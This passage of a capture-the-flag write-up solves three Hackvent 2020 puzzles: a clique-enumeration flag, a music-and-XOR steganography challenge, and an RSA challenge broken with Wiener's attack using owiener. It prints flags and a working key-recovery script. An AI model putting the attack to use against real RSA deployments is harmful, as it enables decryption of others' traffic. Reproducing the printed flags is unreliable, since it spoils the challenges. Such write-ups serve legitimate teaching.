1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    

What immediately jumps out is that everything is either 0 or 1. No clique has
more than one nicest kid.

Starting with the first nice kid, 104, I took a look at the cliques containing
it:

    
    
    >>> [c for c in cliques if 104 in c]
    [[32, 104], [104, 6144], [104, 16384], [104, 15364], [104, 10248, 636, 17793, 9475, 6662, 9479, 6407, 6030, 13180, 16526, 1424, 3989, 17046, 18711, 12952, 1305, 9628, 13724, 12445, 13213, 800, 4129, 10273, 8866, 17442, 11429, 6437, 18086, 12583, 5289, 3498, 11563, 11691, 13740, 11566, 3889, 10163, 18099, 2997, 2233, 8377, 16059, 12348, 9149, 18495, 2625, 11585, 14785, 1860, 6855, 714, 16975, 16465, 13024, 12636, 2527, 11355, 12011, 7762, 8275, 9079, 7763, 10997, 6358, 18006, 214, 7545, 378, 8058, 8316, 1375], [104, 12297], [104, 6157], [104, 8206], [104, 16398], [104, 18452], [104, 11284], [104, 1049], [104, 13342], [104, 15394], [104, 10284], [104, 5166], [104, 14388], [104, 5183], [104, 13375], [104, 1091], [104, 16452], [104, 16454], [104, 18505], [104, 12363], [104, 10317], [104, 15437], [104, 17491], [104, 13401], [104, 13406], [104, 4191], [104, 15454], [104, 12386], [104, 1123], [104, 14438], [104, 18536], [104, 16498], [104, 17525], [104, 122], [104, 10365], [104, 15487], [104, 11396], [104, 10373], [104, 2188], [104, 13453], [104, 8335], [104, 18574], [104, 13455], [104, 4256], [104, 6304], [104, 14496], [104, 16545], [104, 3242], [104, 12463], [104, 181], [104, 17589], [104, 5302], [104, 1208], [104, 5304], [104, 16572], [104, 1210], [104, 13499], [104, 15561], [104, 17610], [104, 6361], [104, 14559], [104, 13535], [104, 5348], [104, 7397], [104, 18662], [104, 15595], [104, 4332], [104, 12525], [104, 3320], [104, 8443], [104, 9467], [104, 16638], [104, 2308], [104, 10507], [104, 11533], [104, 3343], [104, 6419], [104, 6427], [104, 18722], [104, 14633], [104, 11573], [104, 4407], [104, 314], [104, 2367], [104, 7495], [104, 6475], [104, 5452], [104, 16722], [104, 12632], [104, 349], [104, 14685], [104, 15711], [104, 5475], [104, 4456], [104, 5485], [104, 12655], [104, 368], [104, 11643], [104, 11646], [104, 5510], [104, 6548], [104, 4501], [104, 12705], [104, 5537], [104, 8613], [104, 1466], [104, 17855], [104, 17859], [104, 3525], [104, 3529], [104, 8650], [104, 6609], [104, 10705], [104, 12753], [104, 16851], [104, 9690], [104, 10736], [104, 12792], [104, 3583], [104, 17919], [104, 10754], [104, 3589], [104, 518], [104, 9736], [104, 8720], [104, 2577], [104, 15888], [104, 3607], [104, 2584], [104, 13848], [104, 11802], [104, 5661], [104, 552], [104, 2601], [104, 11816], [104, 11818], [104, 2607], [104, 5681], [104, 15923], [104, 1593], [104, 17988], [104, 13895], [104, 16969], [104, 1616], [104, 2655], [104, 12897], [104, 5744], [104, 18037], [104, 5751], [104, 1659], [104, 7803], [104, 16002], [104, 8835], [104, 8836], [104, 13956], [104, 10890], [104, 16015], [104, 4754], [104, 1684], [104, 12955], [104, 13985], [104, 676], [104, 15016], [104, 8876], [104, 8882], [104, 1714], [104, 18106], [104, 5821], [104, 18109], [104, 6851], [104, 17104], [104, 13014], [104, 18136], [104, 10975], [104, 2797], [104, 4845], [104, 7922], [104, 3836], [104, 12030], [104, 15104], [104, 6924], [104, 18201], [104, 11038], [104, 5920], [104, 18209], [104, 11043], [104, 1830], [104, 12080], [104, 4914], [104, 18227], [104, 4916], [104, 11062], [104, 6973], [104, 10046], [104, 4930], [104, 18242], [104, 8015], [104, 15184], [104, 6997], [104, 2905], [104, 3946], [104, 2932], [104, 13178], [104, 18302], [104, 897], [104, 7042], [104, 13195], [104, 9101], [104, 16283], [104, 15264], [104, 10144], [104, 16297], [104, 11184], [104, 16306], [104, 950], [104, 18357], [104, 5049], [104, 5050], [104, 8124], [104, 14269], [104, 15296], [104, 3010], [104, 13254], [104, 11207], [104, 13262], [104, 6100], [104, 15321], [104, 16349], [104, 1002], [104, 11247], [104, 1014], [104, 1018], [104, 3069]]
    

This time what jumped out is that most of the cliques are of length two, or
just two points that are connected. I’ll update the list comprehension to
print the length of the clique instead of the clique itself:

    
    
    >>> [len(c) for c in cliques if 104 in c]
    [2, 2, 2, 2, 72, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2]
    

They are all two, except for one, 72. The next nice kid (118) shows the same
behavior:

    
    
    >>> [len(c) for c in cliques if 118 in c]
    [2, 86, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2]
    

The lengths of the one longer clique in the first two are 72 (ASCII H) and 86
(ASCII V). I’ll add the `len(c) > 2` criteria to the list comprehension:

    
    
    >>> [len(c) for c in cliques if 118 in c and len(c) > 2] 
    [86]
    

Now loop over all nice kids:

    
    
    >>> [[len(c) for c in cliques if kid in c and len(c) > 2] for kid in nicekids]
    [[72], [86], [50], [48], [123], [77], [97], [120], [49], [109], [97], [108], [95], [67], [108], [49], [113], [117], [51], [95], [69], [110], [117], [109], [51], [114], [64], [116], [49], [48], [110], [95], [70], [117], [110], [33], [125]]
    

Converting those into characters makes the flag:

    
    
    >>> ''.join([chr([len(c) for c in cliques if kid in c and len(c) > 2][0]) for kid in nicekids])
    'HV20{Max1mal_Cl1qu3_Enum3r@t10n_Fun!}'
    

**Flag:`HV20{Max1mal_Cl1qu3_Enum3r@t10n_Fun!}`**

## HV20.11

### Challenge

![hv20-ball11](https://0xdfimages.gitlab.io/img/hv20-ball11.png) | HV20.11 Chris'mas carol  
---|---  
Categories: |  ![fun](../img/hv-cat-fun.png)FUN   
Level: | medium  
Author: |  Chris   
  
> Since yesterday’s challenge seems to have been a bit on the hard side, we’re
> adding a small musical innuendo to relax.
>
> My friend Chris from Florida sent me this score. Enjoy! Is this what you
> call postmodern?

![img](https://0xdfimages.gitlab.io/img/2e571ba0-57a5-435b-a992-5f02546f9e90.png)

There’s a hint as well:

> He also sent this image, but that doesn’t look like Miami’s skyline to me.

![](https://0xdfimages.gitlab.io/img/f3d66342-bdbc-4fe6-859a-385300057e07.png)

### Solution

#### Music

There’s a way of labeling specific keys on the piano / in music called
[Scientific Pitch
Notation](https://en.wikipedia.org/wiki/Scientific_pitch_notation). Each note
has it’s letter (C) as well as a number that defines it’s octave (how high or
low). This image is really useful to visualize it:

![image-20201211105702059](https://0xdfimages.gitlab.io/img/image-20201211105702059.png)

Looking at the music from the challenge, there are two notes at any given
time.

![](https://0xdfimages.gitlab.io/img/2e571ba0-57a5-435b-a992-5f02546f9e90-labeled.png)

There’s another clue in the image. The Sharpen filter in Gimp makes it easier
to see, it is visible in the image above as well:

![](https://0xdfimages.gitlab.io/img/2e571ba0-57a5-435b-a992-5f02546f9e90-sharpen.png)

That’s the symbol for
[xor](https://en.wikipedia.org/wiki/List_of_mathematical_symbols#Basic_logic).

Putting that all together, there are two hex strings and a hint to xor. Doing
that gives a string:

    
    
    >>> x1 = binascii.unhexlify("e3b4f4e3d3e2d3a5b5d5a2e5a5e3a3")
    >>> x2 = binascii.unhexlify("b3e3d5d3a3d1a1c4e3e4d1d4d1d3d1")
    >>> ''.join([chr(x ^ y) for x,y in zip(x1, x2)])
    'PW!0p3raV1s1t0r'
    

#### mobilefish

A google image search on the hint image reveals that it is of Victory Peak in
Hong Kong After the wikipedia page for Hong Kong, an article about Hong Kong,
and a bunch of “Visually similar images”, the third link is to an online
steganography service on
[www,mobilefish.com](https://www.mobilefish.com/services/steganography/steganography.php).
In the description of the service, it says:

> See an example of a photo where a secret message is hidden:
> https://www.mobilefish.com/download/steganography/hongkong.png To unhide the
> secret message use this tool and enter password: _joshua_

This is exactly the same image that Hackvent provided (hashes match).
Providing it to this service with the password `joshua` extracts demo text:

![image-20201211125841349](https://0xdfimages.gitlab.io/img/image-20201211125841349.png)

Given that I’m pretty sure that’s not what I’m looking for, I uploaded the
notes image to this service. When I tried to enter the password from above, it
returns that it is invalid:

![image-20201211125947278](https://0xdfimages.gitlab.io/img/image-20201211125947278.png)

On trying it with no password, it works:

![image-20201211130006134](https://0xdfimages.gitlab.io/img/image-20201211130006134.png)

The file that downloads is `flag.zip`.

#### Extract

With the zip and the password, I can extract `flag.txt`:

    
    
    $ 7z x flag.zip 
    
    7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
    p7zip Version 16.02 (locale=en_US.utf8,Utf16=on,HugeFiles=on,64 bits,3 CPUs Intel(R) Core(TM) i7-7700 CPU @ 3.60GHz (906E9),ASM,AES-NI)
    
    Scanning the drive for archives:
    1 file, 221 bytes (1 KiB)
    
    Extracting archive: flag.zip
    --
    Path = flag.zip
    Type = zip
    Physical Size = 221
    
        
    Enter password (will not be echoed):
    Everything is Ok
    
    Size:       21
    Compressed: 221
    

`flag.txt` has the flag:

    
    
    $ cat flag.txt 
    HV20{r3ad-th3-mus1c!}
    

**Flag:`HV20{r3ad-th3-mus1c!}`**

## HV20.12

### Challenge

![hv20-ball12](https://0xdfimages.gitlab.io/img/hv20-ball12.png) | HV20.12 Wiener waltz  
---|---  
Categories: |  ![crypto](../img/hv-cat-crypto.png)CRYPTO   
Level: | medium  
Author: |  SmartSmurf   
  
> **Introduction**
>
> During their yearly season opening party our super-smart elves developed an
> improved usage of the well known RSA crypto algorithm. Under the “Green IT”
> initiative they decided to save computing horsepower (or rather reindeer
> power?) on their side. To achieve this they chose a pretty large private
> exponent, around 1/4 of the length of the modulus - impossible to guess. The
> reduction of 75% should save a lot of computing effort while still being
> safe. Shouldn’t it?
>
> **Mission**
>
> Your SIGINT team captured some communication containing key exchange and
> encrypted data. Can you recover the original message?
>
>
> [Download](https://drive.google.com/u/1/uc?id=1s1OChtYdGSg607c_Zz6mcevRiP_PzrWf&export=download)
>
> **Hints**
>
>   * Don’t waste time with the attempt to brute-force the private key
>

The file is a packet capture:

    
    
    $ file b7307460-be03-45be-bd9f-b404b48e62c9.pcap 
    b7307460-be03-45be-bd9f-b404b48e62c9.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 65535)
    

### Solution

#### PCAP

Inside the PCAP there are two TCP streams, but only one that is relevant to
the challenge:

![image-20201212124517517](https://0xdfimages.gitlab.io/img/image-20201212124517517.png)

It contains the exchange of RSA encrypted data. There are two base64-encoded
strings that represent `n` and `e`, important numbers in RSA. There’s also
four messages with a `blockId` (0-3) and a base64-encoded string `data`. The
other important thing to notice is the `format` of `["mpz_export",-1,4,1,0]`.

#### Get n and e

Looking at `mpz_export` led to [this page](https://gmplib.org/manual/Integer-
Import-and-Export), which gives the function parameters for `mpz_export` and
`mpz_import`. Looking at those, a reasonable guess is that -1, 4, 1, 0 are the
`int order`, `size_t size`, `int endian`, and `size_t nails` respectively.

  * `order == -1` –> least significant word first
  * `size == 4` –> four bytes per word
  * `endian == 1` –> big endian within the word
  * `nails 0` –> use the full words

Base64-decoding the text provides a byte stream. To get it to an int, I’ll
have to break it into four-byte words, and then reverse the order. I wrote a
helper function in Python to do that:

    
    
    def reorder(b):
        return b''.join([b[i:i+4] for i in range(0, len(b), 4)][::-1])
    

That function will now allow the calculation of `n` and `e` as integers:

    
    
    eb = reorder(base64.b64decode("S/0OzzzDRdsps+I85tNi4d1i3d0Eu8pimcP5SBaqTeBzcADturDYHk1QuoqdTtwX9XY1Wii6AnySpEQ9eUEETYQkTRpq9rBggIkmuFnLygujFT+SI3Z+HLDfMWlBxaPW3Exo5Yqqrzdx4Zze1dqFNC5jJRVEJByd7c6+wqiTnS4dR77mnFaPHt/9IuMhigVisptxPLJ+    g9QX4ZJX8ucU6GPSVzzTmwlDIjaenh7L0bC1Uq/euTDUJjzNWnMpHLHnSz2vgxLg4Ztwi91dOpO7KjvdZQ7++nlHRE6zlMHTsnPFSwLwG1ZxnGVdFnuMjEbPA3dcTe54LxOSb2cvZKDZqA=="))
    nb = reorder(base64.b64decode("dbn25TSjDhUge4L68AYooIqwo0HC2mIYxK/ICnc+8/0fZi1CHo/QwiPCcHM94jYdfj3PIQFTri9j/za3oO+3gVK39bj2O9OekGPG2M1GtN0Sp+ltellLl1oV+TBpgGyDt8vcCAR1B6shOJbjPAFqL8iTaW1C4KyGDVQhQrfkXtAdYv3ZaHcV8tC4ztgA4euP9o1q+       kZux0fTv31kJSE7K1iJDpGfy1HiJ5gOX5T9fEyzSR0kA3sk3a35qTuUU1OWkH5MqysLVKZXiGcStNErlaggvJb6oKkx1dr9nYbqFxaQHev0EFX4EVfPqQzEzesa9ZAZTtxbwgcV9ZmTp25MZg=="))
    
    e = int.from_bytes(eb, 'big')
    n = int.from_bytes(nb, 'big')
    

#### Wiener

From the title of the challenge, Wiener is an attack on RSA when the private
exponent (d) is too small (see
[paper](https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3985315/)). The prompt
suggest they “chose a pretty large private exponent” (which suggests maybe it
wasn’t large enough).

[The oWiener Python package](https://github.com/orisano/owiener) looks like
it’ll help here. After `pip3 install owiener` it’s easy enough to add to the
script:

    
    
    d = owiener.attack(e, n)
    
    if d is None:
        print("[-] Wiener failed")
        sys.exit()
    else:
        print("[+] Found d={}".format(d))
    

It does produce a `d` (private key):

    
    
    $ python3 -i solve.py 
    [+] Found d=6466004211023169931626852412529775638154232788523485346270752857587637907099874953950214032608531274791907536993470882928101441905551719029085370950197807
    

#### Decrypt

With d in hand, the RSA-encrypted messages can be decrypted. To decrypt RSA,
convert the message to an int, and then call `pow(msg, d, n)`, and the result
will be the int version of the plaintext.

There are four message blocks from the PCAP. I tried a few combinations of
looking at them individually, as a group, with and without word re-ordering.
What worked was to order them by the block id, base64-decode them, and then
join them into one byte stream:

    
    
    msg = b''.join(list(map(base64.b64decode,
            ["fJdSIoC9qz27pWVpkXTIdJPuR9Fidfkq1IJPRQdnTM2XmhrcZToycoEoqJy91BxikRXQtioFKbS7Eun7oVS0yw==",
            "vzwheJ3akhr1LJTFzmFxdhBgViykRpUldFyU6qTu5cjxd1fOM3xkn49GYEM+2cUVk22Tu5IsYDbzJ4/zSDfzKA==",
            "fRYUyYEINA5i/hCsEtKkaCn2HsCp98+ksi/8lw1HNTP+KFyjwh2gZH+nkzLwI+fdJFbCN5iwFFXo+OzgcEMFqw==",
            "+y2fMsE0u2F6bp2VP27EaLN68uj2CXm9J1WVFyLgqeQryh5jMyryLwuJNo/pz4tXzRqV4a8gM0JGdjvF84mf+w=="])))
    
